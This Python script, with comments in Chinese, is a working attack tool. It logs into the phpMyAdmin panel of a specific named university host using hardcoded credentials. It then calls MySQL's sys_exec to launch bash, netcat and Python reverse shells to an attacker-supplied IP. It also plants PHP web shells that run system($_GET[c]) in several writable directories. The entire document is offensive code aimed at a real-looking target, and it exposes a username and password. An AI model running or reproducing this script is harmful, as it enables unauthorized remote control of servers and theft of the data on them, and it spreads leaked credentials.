#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[+] sys_exec可以执行命令!\n")

# 方法1: 反向shell
print("[*] 方法1: 反向shell")
print("[!] 请先在你的机器上运行: nc -lvp 4444")
LHOST = "YOUR_IP"  # 替换为你的IP
LPORT = "4444"

reverse_shells = [
    f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    f"nc -e /bin/bash {LHOST} {LPORT}",
    f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
]

for shell_cmd in reverse_shells:
    sql = f"SELECT sys_exec('{shell_cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    print(f"[*] 执行: {shell_cmd[:50]}...")
    print(f"[*] 检查监听器是否收到连接...")

# 方法2: 写入shell到已知可写目录
print("\n[*] 方法2: 写入shell到可写目录")
writable_paths = [
    "/tmp/shell.php",
    "/var/tmp/shell.php",
    "/dev/shm/shell.php",
]

for write_path in writable_paths:
    cmd = f"echo '<?php system($_GET[c]); ?>' > {write_path}"
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    print(f"[*] 写入到: {write_path}")
    # 需要通过文件包含访问

print("\n[+] 完成!")
print("[*] sys_exec可以执行任意系统命令")
print("[*] 使用反向shell是最直接的方法")
